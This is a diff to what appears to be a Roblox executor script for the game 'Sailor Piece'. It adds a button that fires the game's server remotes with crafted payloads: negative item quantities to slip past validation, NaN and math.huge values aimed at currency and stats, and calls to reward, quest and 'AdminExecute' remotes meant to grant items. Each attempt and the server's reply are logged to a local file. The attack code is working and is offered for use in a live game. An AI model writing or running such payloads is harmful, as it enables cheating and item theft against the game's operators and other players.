@@ -164,7 +164,7 @@ local Title = Instance.new("TextLabel", TitleBar)
 Title.Size = UDim2.new(1, -40, 1, 0)
 Title.Position = UDim2.new(0, 12, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "⚔️  SAILOR PIECE — AUTO FARMEO"
+Title.Text = "⚔️  SAILOR PIECE — AUTO FARM"
 Title.TextColor3 = C.title
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 15
@@ -2107,6 +2107,115 @@ BtnForenseNPC.MouseButton1Click:Connect(function()
                 "\n  Si no hubo INVOKE_SALIDA al hablar con el NPC → usa FireServer (sin retorno)." ..
                 "\n  Si no hubo nada → el NPC no envía al servidor (lógica local pura).")
         end)
+    end)
+end)
+
+-- ================================================================
+-- VULNERABILITY INJECTION — Pruebas de Underflow y Bypass en Remotes
+-- ================================================================
+SectionLabel(AnalistaPage, "ATAQUE SERVER-SIDE (MITM)", 30)
+
+local BtnAtaque = ToggleButton(AnalistaPage, "💣 INYECCIÓN VULNERABLE (Fuzzing)", 31, Color3.fromRGB(200, 50, 20))
+BtnAtaque.LayoutOrder = 31
+
+local AtaqueLog = Instance.new("TextLabel", AnalistaPage)
+AtaqueLog.Size = UDim2.new(0.95, 0, 0, 50)
+AtaqueLog.BackgroundTransparency = 1
+AtaqueLog.TextColor3 = Color3.fromRGB(255, 100, 100)
+AtaqueLog.Font = Enum.Font.Code
+AtaqueLog.TextSize = 10
+AtaqueLog.TextWrapped = true
+AtaqueLog.TextXAlignment = Enum.TextXAlignment.Left
+AtaqueLog.LayoutOrder = 32
+AtaqueLog.Text = "  ⬛ DETENIDO — Ejecutará payload al servidor"
+
+local ATK_FILE = "Attack_Vulnerability_Report.txt"
+local ataqueStep = 0
+
+local function logAtk(msg)
+    pcall(function()
+        if not writefile then return end
+        ataqueStep = ataqueStep + 1
+        local act = ""
+        if isfile and readfile and isfile(ATK_FILE) then
+            pcall(function() act = readfile(ATK_FILE) end)
+        end
+        local prefix = "[" .. string.format("%02d", ataqueStep) .. "] "
+        writefile(ATK_FILE, act .. prefix .. msg .. "\n")
+    end)
+end
+
+BtnAtaque.MouseButton1Click:Connect(function()
+    if _G.AtaqueActivo then
+        _G.AtaqueActivo = false
+        AtaqueLog.Text = "  ⬛ ATAQUE DETENIDO"
+        return
+    end
+    _G.AtaqueActivo = true
+    ataqueStep = 0
+    AtaqueLog.Text = "  💣 ATACANDO Remotes (Underflow/NaN)..."
+    
+    pcall(function()
+        if writefile then
+            writefile(ATK_FILE, "=== REPORTE DE ATAQUE DE VULNERABILIDAD/FUZZING ===\n" ..
+                "Fecha: " .. tostring(os.date("%Y-%m-%d %H:%M:%S")) .. "\n\n")
+        end
+    end)
+    
+    task.spawn(function()
+        local RS = game:GetService("ReplicatedStorage")
+        
+        local function FireIf(name, ...)
+            local r = RS:FindFirstChild(name, true)
+            local argsT = {...}
+            local argsStr = dumpTable(argsT, "")
+
+            if r and r:IsA("RemoteEvent") then
+                logAtk("🔥 EVENTO => [" .. name .. "]\n  Payload: " .. argsStr)
+                r:FireServer(...)
+            elseif r and r:IsA("RemoteFunction") then
+                logAtk("🔥 INVOKE => [" .. name .. "]\n  Payload: " .. argsStr)
+                task.spawn(function()
+                    local ok, res = pcall(function() return r:InvokeServer(...) end)
+                    if ok then logAtk("✅ RESPUESTA (" .. name .. "):\n  " .. dumpTable(res, "  "))
+                    else logAtk("❌ ERROR/RECHAZO (" .. name .. "):\n  " .. tostring(res)) end
+                end)
+            else
+                logAtk("⚠️ Remote NO encontrado: [" .. name .. "]")
+            end
+        end
+        
+        -- Payload 1: Underflow Allocation
+        logAtk("--- 1. PROBANDO INYECCIÓN UNDERFLOW (Bypass validación con negativos) ---")
+        FireIf("StorageStoreItem", "Chrysalis Sigil", -29)
+        FireIf("StorageRetrieveItem", "Chrysalis Sigil", -29)
+        FireIf("PurchaseItem", "Chrysalis Sigil", -999)
+        FireIf("ExchangeItem", "Evolution Fragment", -1)
+        
+        task.wait(1)
+        if not _G.AtaqueActivo then return end
+        
+        -- Payload 2: Poisoning NaN (No Es Un Número) / Infinite
+        logAtk("--- 2. PROBANDO CORRUPCIÓN NaN / math.huge ---")
+        FireIf("StorageRetrieveItem", "Transcendent Core", 0/0)
+        FireIf("StorageStoreItem", "Transcendent Core", 0/0)
+        FireIf("ExchangeItem", "Transcendent Core", 0/0)
+        
+        task.wait(1)
+        if not _G.AtaqueActivo then return end
+        
+        -- Payload 3: Direct Bypass / Bypass Recompensa
+        logAtk("--- 3. PROBANDO EXPLOTACIÓN DIRECTA (Huérfanos / Admin bypass) ---")
+        FireIf("NPCReward", "QuestNPC9")
+        FireIf("QuestComplete", "Transcendent Being")
+        FireIf("AdminExecute", {Command = "GiveItem", Args={"Chrysalis Sigil", 29}})
+        FireIf("AddCurrency", "Gems", math.huge)
+        FireIf("AllocateStat", "Damage", math.huge)
+        
+        task.wait(3)
+        logAtk("--- FINAL DE EJECUCIÓN (Verifica Data o kicks por AntiCheat) ---")
+        AtaqueLog.Text = "  🛑 ATAQUE FINALIZADO. Revisa: Attack_Vulnerability_Report.txt"
+        _G.AtaqueActivo = false
     end)
 end)
 
